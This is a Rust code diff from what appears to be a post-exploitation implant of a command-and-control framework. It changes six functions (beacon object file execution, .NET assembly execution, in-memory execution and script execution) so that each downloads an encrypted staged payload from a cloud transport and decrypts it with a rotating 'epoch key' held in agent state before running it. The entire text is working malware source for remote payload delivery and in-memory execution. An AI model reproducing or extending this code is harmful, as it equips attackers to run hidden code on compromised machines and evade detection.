@@ -21,7 +21,7 @@ pub fn bof_exec(
     staging_path: &str,
     args: &str,
 ) -> String {
-    let data = match _fetch_staged(transport, staging_path, session_key) {
+    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
         Ok(d) => d,
         Err(e) => return e,
     };
@@ -41,7 +41,7 @@ pub fn assembly_exec(
     staging_path: &str,
     args: &str,
 ) -> String {
-    let data = match _fetch_staged(transport, staging_path, session_key) {
+    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
         Ok(d) => d,
         Err(e) => return e,
     };
@@ -60,7 +60,7 @@ pub fn assembly_exec_ab(
     staging_path: &str,
     args: &str,
 ) -> String {
-    let data = match _fetch_staged(transport, staging_path, session_key) {
+    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
         Ok(d) => d,
         Err(e) => return e,
     };
@@ -80,7 +80,7 @@ pub fn memexec(
     staging_path: &str,
     args: &str,
 ) -> String {
-    let data = match _fetch_staged(transport, staging_path, session_key) {
+    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
         Ok(d) => d,
         Err(e) => return e,
     };
@@ -103,7 +103,7 @@ pub fn script_exec(
     staging_path: &str,
     args: &str,
 ) -> String {
-    let data = match _fetch_staged(transport, staging_path, session_key) {
+    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
         Ok(d) => d,
         Err(e) => return e,
     };
@@ -118,7 +118,7 @@ pub fn script_exec_ab(
     staging_path: &str,
     args: &str,
 ) -> String {
-    let data = match _fetch_staged(transport, staging_path, session_key) {
+    let data = match _fetch_staged_v2(_state, transport, staging_path, session_key) {
         Ok(d) => d,
         Err(e) => return e,
     };
@@ -134,19 +134,21 @@ pub fn script_exec_ab(
 // SHARED: fetch + decrypt staged binary
 // ══════════════════════════════════════════════════════════════════════════════
 
-fn _fetch_staged(
+fn _fetch_staged_v2(
+    state: &Arc<AgentState>,
     transport: &SharedTransport,
     staging_path: &str,
-    session_key: &[u8; 32],
+    _session_key: &[u8; 32],
 ) -> Result<Vec<u8>, String> {
     crate::dlog!("stage", "downloading {}", staging_path);
     let enc_data = transport.download(staging_path)
         .ok_or_else(|| "[error] Failed to download staged binary from cloud".to_string())?;
-    crate::dlog!("stage", "downloaded {} bytes (encrypted)", enc_data.len());
     if enc_data.is_empty() {
         return Err("[error] Staged file is empty".to_string());
     }
-    let data = crate::crypto::decrypt_staging(&enc_data, session_key)
+    let ek = state.epoch_key.lock().unwrap();
+    let data = ek.as_ref()
+        .and_then(|k| crate::crypto::decrypt_staging(&enc_data, k))
         .ok_or_else(|| "[error] Staging decryption failed".to_string())?;
     crate::dlog!("stage", "decrypted OK, {} bytes plaintext", data.len());
     Ok(data)
